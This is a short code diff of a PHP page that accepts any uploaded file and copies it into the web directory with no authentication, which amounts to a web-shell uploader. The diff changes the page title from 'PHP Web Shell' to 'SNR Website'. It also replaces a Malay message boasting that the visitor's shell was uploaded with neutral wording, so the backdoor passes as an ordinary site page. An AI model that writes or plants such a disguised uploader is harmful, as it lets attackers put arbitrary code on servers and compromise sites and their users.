@@ -2,15 +2,15 @@
 <html>
 
 <head>
-    <title>PHP Web Shell</title>
+    <title>SNR Website</title>
   </head>
 
 <?php
 echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
 echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
 if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Korang Dah Berjaya Upload Shell Korang!!!<b><br><br>'; }
-else { echo '<b>file uploaded!</b><br><br>'; }
+if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>file uploaded!!!<b><br><br>'; }
+else { echo '<b>file not uploaded!</b><br><br>'; }
 }
 ?>
   
